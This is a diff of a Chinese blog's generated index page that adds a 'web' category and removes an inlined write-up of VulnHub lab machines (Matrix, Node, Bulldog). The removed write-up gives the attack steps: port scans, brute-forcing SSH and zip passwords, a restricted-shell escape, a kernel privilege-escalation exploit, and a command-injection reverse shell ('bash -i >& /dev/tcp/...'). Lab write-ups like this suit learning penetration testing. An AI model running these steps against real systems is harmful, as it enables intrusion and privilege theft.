@@ -294,6 +294,28 @@
           </span>
 
           
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing">
+                  <a href="/categories/web/" itemprop="url" rel="index">
+                    <span itemprop="name">web</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
 
           
             
@@ -322,148 +344,15 @@
 
       
         
-          
-            <h1 id="openvpn配置"><a href="#openvpn配置" class="headerlink" title="openvpn配置"></a>openvpn配置</h1><p>在kali下安装这几个源</p>
-<ul>
-<li>apt-get install network-manager-openvpn</li>
-<li>apt-get install network-manager-openvpn-gnome</li>
-<li>apt-get install network-manager-pptp</li>
-<li>apt-get install network-manager-pptp-gnome</li>
-<li>apt-get install network-manager-strongswan</li>
-<li>apt-get install network-manager-vpnc</li>
-<li>apt-get install network-manager-vpnc-gnome</li>
-</ul>
-<p>在access页面点击here下载openvpn配置文件<br><a href="https://www.hackthebox.eu/home/htb/access/ovpnfile" target="_blank" rel="noopener">https://www.hackthebox.eu/home/htb/access/ovpnfile</a></p>
-<ul>
-<li>使用命令：xxxx.ovpn是下载好的配置文件,这里要用root权限运行。<br>sudo oepnvpn –config xxxx.ovpn</li>
-</ul>
-<hr>
-<h1 id="vulnhub-Matrix-1"><a href="#vulnhub-Matrix-1" class="headerlink" title="vulnhub Matrix:1"></a>vulnhub Matrix:1</h1><ul>
-<li><p>0x00 使用arp-scan命令探测局域网内的主机确定靶机ip   </p>
-<blockquote>
-<p><code># arp-scan -l</code></p>
-</blockquote>
-</li>
-<li><p>0x01 使用nmap扫描靶机的端口，探测靶机开放的服务</p>
-<blockquote>
-<p><code># namp -sS -sV --open [ip]</code><br><code># namp -sS -A -p [port] [ip]</code></p>
-</blockquote>
-</li>
-<li><p>0x02 访问开放的端口上的web服务，发现在31337的web服务的源码页面隐藏了一段base64，解密发现Cypher.matrix，访问该页面，得到一段brainfuck加密的密文。解码，被告知8位ssh的密码前6位，还需要爆破出后两位   </p>
-</li>
-<li><p>0x03 使用crunch工具生成字典，使用medusa来爆破ssh密码</p>
-<blockquote>
-<p><code># crunch 8 8 -t k1ll0r%@ &gt; 1.txt</code><br><code># medusa -h [ip] -u [username] -P 1.txt -M ssh</code>   </p>
-</blockquote>
-<p>得到密码<strong>k1ll0r7n</strong>，然后连接ssh</p>
-</li>
-<li><p>0x04登陆ssh后，运行ls命令，发现运行的是受限制的rbash，查看$PATH得到   </p>
-<blockquote>
-<p>-rbash: /home/guest/prog: restricted: cannot specify `/‘ in command names   </p>
-</blockquote>
-<p>查看可用的命令：<code># echo /home/guest/prog/*</code><br>发现只有vi可用，因此利用vi命令模式输入!/bin/bash,逃逸受限制的bash</p>
-</li>
-<li><p>0x05 将/usr/bin导出到$PATH变量，/bin/bash导出到$SHELL变量中</p>
-<blockquote>
-<p><code># export PATH=/usr/bin:$PATH</code><br><code># export SHELL=/bin/bash:$SHELL</code></p>
-</blockquote>
-<p>环境变量设好后，发现su命令无法执行，因此将/bin导出到$PATH中</p>
-<blockquote>
-<p><code># export PATH=/bin:$PATH</code></p>
-</blockquote>
-</li>
-<li><p>0x06 执行su命令，切换到root权限，访问/root/flag.txt</p>
-</li>
-</ul>
-<hr>
-<h1 id="vulnhub-Nod1-1"><a href="#vulnhub-Nod1-1" class="headerlink" title="vulnhub Nod1:1"></a>vulnhub Nod1:1</h1><ul>
-<li><p>0x00 使用arp-scan命令探测局域网内的主机确定靶机ip   </p>
-<blockquote>
-<p><code># arp-scan -l</code></p>
-</blockquote>
-</li>
-<li><p>0x01 使用nmap扫描靶机的端口，探测靶机开放的服务</p>
-<blockquote>
-<p><code># namp -sS -sV --open [ip]</code><br><code># namp -sS -A -p [port] [ip]</code>   </p>
-</blockquote>
-<p>得知开放的web服务是用Node.js搭建</p>
-</li>
-<li><p>0x02 访问3000端口上的服务，审计js源码，发现在“assets/js/app/controllers/home.js”这个文件中可以获取到存储敏感信息的位置/api/users/latest/，直接访问/api/usr，得到admin账号信息以及登陆密码<br>使用hash-identifier工具判断密码的加密方式，密码使用sha256加密，直接在在线解密网站上解密，得到登陆密码<strong>manchester</strong></p>
-</li>
-<li><p>0x03 使用得到的admin账号登陆，下载网站的源码myplace.backup。查看文件的部分内容，发现文件使用base64加密，因此用base64命令解密源码文件   </p>
-<blockquote>
-<p><code># base64 -d myplace.backup &gt; myplace.zip</code>      </p>
-</blockquote>
-<p>使用unzip解密压缩包，发现压缩包加密，因此使用fcrackzip工具爆破压缩包密码，使用kali自带的字典 在/usr/share/wordlists/文件夹下</p>
-<blockquote>
-<p><code># fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt myplace.zip</code> </p>
-</blockquote>
-</li>
-<li><p>0x04 得到密码后，解压网站源码，在网站目录下发现app.js文件<br>了解app.js的作用，项目入口及程序启动文件，里面存储着重要配置信息，从该文件中，获取到mongodb的配置信息，得到mark用户的信息，使用mark用户的信息登陆到ssh</p>
-</li>
-<li><p>0x05 登陆后准备提升用户权限，使用<strong>uname -a</strong>命令查看系统版本：linux 4.4.0-93   在kali上使用searchsploit命令查找对应版本的提权exp</p>
-<blockquote>
-<p><code># searchsploit linux 4.4.0</code>   </p>
-</blockquote>
-<p>使用scp命令将提权exp传输到靶机中</p>
-<blockquote>
-<p><code># scp /usr/share/exploitdb/exploits/linux/local/44298.c mark@192.168.172.128:/tmp/</code></p>
-</blockquote>
-<p>在/tmp目录下将exp编译执行</p>
-<blockquote>
-<p><code># gcc 44298.c -o payload</code><br><code># ./paylaod</code></p>
-</blockquote>
-<p>成功提权</p>
-</li>
-</ul>
-<hr>
-<h1 id="vulnhub-Bulldog-1"><a href="#vulnhub-Bulldog-1" class="headerlink" title="vulnhub Bulldog:1"></a>vulnhub Bulldog:1</h1><ul>
-<li><p>0x00 环境搭建<br>在virtualbox中运行靶机，将靶机的网络模式设置成Host-only<br>在VM中运行攻击机，将攻击机的网络设置成桥接模式，桥接的网卡为Vritual box的Host-only   </p>
-</li>
-<li><p>0x01 扫描端口，服务   </p>
-<blockquote>
-<p><code># nmap -sS -sV [ip]</code><br><code># nmap -sS -A -p [port] [ip]</code>   </p>
-</blockquote>
-<p>发现ssh服务和web服务</p>
-</li>
-<li><p>0x02 挖掘目录   </p>
-<blockquote>
-<p><code># dirb http://[ip]</code>  </p>
-</blockquote>
-<p>发现/admin,/dev目录 访问admin目录，尝试登陆，经测试 非弱口令，非注入。访问/dev/shell,发现需要登陆才能使用webshell.再访问dev目录，在源码页面发现多端账号和md5密码，解密得到两个登陆账号，使用其中一个账号登陆</p>
-</li>
-<li><p>0x03 反弹shell<br>webshell命令受限，尝试使用命令注入</p>
-<blockquote>
-<p>pwd &amp; whoami   </p>
-</blockquote>
-<p>whoami命令成功执行，构造命令语句反弹shell。经测试，构造如下语句</p>
-<blockquote>
-<p><code># echo &quot;bash -i &gt;&amp; /dev/tcp/192.168.56.102/666 0&gt;&amp;1 &quot; | bash</code></p>
-</blockquote>
-<p>在攻击机上用nc监听端口</p>
-<blockquote>
-<p><code># nc -lvnp 666</code></p>
-</blockquote>
-<p>在webshell中执行上面构造的语句，成功反弹shell</p>
-</li>
-<li><p>0x03 提权<br>首先查看系统用户</p>
-<blockquote>
-<p><code># cat /etc/passwd</code></p>
-</blockquote>
-<p>发现bulldogadmin这一特殊用户。进入该用户目录下</p>
-<blockquote>
-<p><code># ls -al</code></p>
-</blockquote>
-<p>发现隐藏文件夹，进入文件夹，发现其中一个文件似乎是可执行文件，用strings命令查看文件中的字符串，发现疑似密码的字符串，记下。<br>使用python 调用本地shell   </p>
-<blockquote>
-<p><code>#sudo  python  -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;</code></p>
-</blockquote>
-<p>输入记下的密码，密码正确，成功切换到root用户   </p>
-</li>
-</ul>
-<hr>
-
-          
+          <p>#前言</p>
+<p>了解了一些web相关的知识后，我想通过日盒子来实践所学的内容。此篇是对vulhub上的靶机的渗透过程的记录，因为是初学阶段，所以基本上是照着网上的wp跟着操作的</p>
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2019/10/27/vulbox/#more" rel="contents">
+              阅读全文 &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
         
       
     </div>
@@ -684,13 +573,22 @@
             
 
             
+              
+              
+              <div class="site-state-item site-state-categories">
+                
+                  <span class="site-state-item-count">1</span>
+                  <span class="site-state-item-name">分类</span>
+                
+              </div>
+            
 
             
               
               
               <div class="site-state-item site-state-tags">
                 
-                  <span class="site-state-item-count">1</span>
+                  <span class="site-state-item-count">2</span>
                   <span class="site-state-item-name">标签</span>
                 
               </div>
